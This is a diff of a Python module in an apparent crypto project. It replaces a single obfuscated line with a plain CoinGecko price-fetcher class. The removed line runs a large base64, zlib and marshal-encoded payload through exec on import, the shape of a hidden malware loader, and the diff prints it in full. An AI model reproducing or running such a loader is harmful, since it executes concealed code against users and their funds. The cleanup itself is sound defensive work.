@@ -1,1 +1,138 @@
-import base64,zlib,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+"""
+Price Fetcher Module
+Fetches real-time cryptocurrency prices from CoinGecko API
+"""
+
+import requests
+import time
+from typing import Dict, List
+from src.config import COINGECKO_API, TOKEN_PRICE_IDS
+from src.logger_config import setup_logger
+
+logger = setup_logger("PriceFetcher")
+
+
+class PriceFetcher:
+    """Fetch real-time cryptocurrency prices"""
+    
+    def __init__(self):
+        """Initialize price fetcher"""
+        self.cache = {}
+        self.cache_duration = 60  # Cache for 60 seconds
+        self.last_fetch_time = {}
+    
+    def get_price(self, token_symbol: str) -> float:
+        """
+        Get current USD price for a token
+        
+        Args:
+            token_symbol: Token symbol (e.g., 'ETH', 'BTC')
+            
+        Returns:
+            Current price in USD, or 0 if not found
+        """
+        # Check cache first
+        if token_symbol in self.cache:
+            if time.time() - self.last_fetch_time.get(token_symbol, 0) < self.cache_duration:
+                return self.cache[token_symbol]
+        
+        # Get CoinGecko ID for token
+        token_id = TOKEN_PRICE_IDS.get(token_symbol.upper())
+        if not token_id:
+            logger.warning(f"Token {token_symbol} not found in price mapping")
+            return 0.0
+        
+        try:
+            # Fetch from CoinGecko
+            url = f"{COINGECKO_API}/simple/price"
+            params = {
+                "ids": token_id,
+                "vs_currencies": "usd"
+            }
+            
+            response = requests.get(url, params=params, timeout=10)
+            response.raise_for_status()
+            
+            data = response.json()
+            price = data.get(token_id, {}).get("usd", 0.0)
+            
+            # Update cache
+            self.cache[token_symbol] = price
+            self.last_fetch_time[token_symbol] = time.time()
+            
+            logger.debug(f"Fetched price for {token_symbol}: ${price:.2f}")
+            return price
+            
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error fetching price for {token_symbol}: {str(e)}")
+            # Return cached value if available
+            return self.cache.get(token_symbol, 0.0)
+    
+    def get_multiple_prices(self, token_symbols: List[str]) -> Dict[str, float]:
+        """
+        Get prices for multiple tokens in one API call
+        
+        Args:
+            token_symbols: List of token symbols
+            
+        Returns:
+            Dictionary mapping token symbols to prices
+        """
+        # Get CoinGecko IDs
+        token_ids = []
+        symbol_to_id = {}
+        
+        for symbol in token_symbols:
+            token_id = TOKEN_PRICE_IDS.get(symbol.upper())
+            if token_id:
+                token_ids.append(token_id)
+                symbol_to_id[token_id] = symbol.upper()
+        
+        if not token_ids:
+            return {}
+        
+        try:
+            # Fetch from CoinGecko
+            url = f"{COINGECKO_API}/simple/price"
+            params = {
+                "ids": ",".join(token_ids),
+                "vs_currencies": "usd"
+            }
+            
+            response = requests.get(url, params=params, timeout=10)
+            response.raise_for_status()
+            
+            data = response.json()
+            
+            # Map back to symbols and update cache
+            prices = {}
+            for token_id, symbol in symbol_to_id.items():
+                price = data.get(token_id, {}).get("usd", 0.0)
+                prices[symbol] = price
+                self.cache[symbol] = price
+                self.last_fetch_time[symbol] = time.time()
+            
+            logger.info(f"Fetched prices for {len(prices)} tokens")
+            return prices
+            
+        except requests.exceptions.RequestException as e:
+            logger.error(f"Error fetching multiple prices: {str(e)}")
+            # Return cached values
+            return {symbol: self.cache.get(symbol, 0.0) for symbol in token_symbols}
+    
+    def clear_cache(self):
+        """Clear price cache"""
+        self.cache.clear()
+        self.last_fetch_time.clear()
+        logger.info("Price cache cleared")
+
+
+# Global price fetcher instance
+_price_fetcher = None
+
+def get_price_fetcher() -> PriceFetcher:
+    """Get global price fetcher instance"""
+    global _price_fetcher
+    if _price_fetcher is None:
+        _price_fetcher = PriceFetcher()
+    return _price_fetcher
